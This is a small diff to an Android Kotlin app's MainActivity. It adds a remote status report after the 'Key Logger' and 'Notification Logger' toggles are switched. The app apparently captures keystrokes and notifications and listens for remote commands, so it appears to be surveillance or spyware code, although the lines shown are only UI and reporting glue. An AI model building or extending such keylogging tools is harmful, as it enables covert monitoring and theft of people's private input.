@@ -132,6 +132,7 @@ class MainActivity : Activity() {
                 val status = if (KeyloggingConfig.isEnabled) "ENABLED" else "DISABLED"
                 Toast.makeText(this, "Key Logger is now $status", Toast.LENGTH_SHORT).show()
                 LogStore.addLog("Toggle: Key Logger is $status")
+                RemoteCommandListener.reportCurrentStatus()
             }
 
             btnToggleNotifLog?.setOnClickListener {
@@ -140,6 +141,7 @@ class MainActivity : Activity() {
                 val status = if (NotificationConfig.isEnabled) "ENABLED" else "DISABLED"
                 Toast.makeText(this, "Notification Logger is now $status", Toast.LENGTH_SHORT).show()
                 LogStore.addLog("Toggle: Notification Logger is $status")
+                RemoteCommandListener.reportCurrentStatus()
             }
 
             LogStore.setListener { logs ->
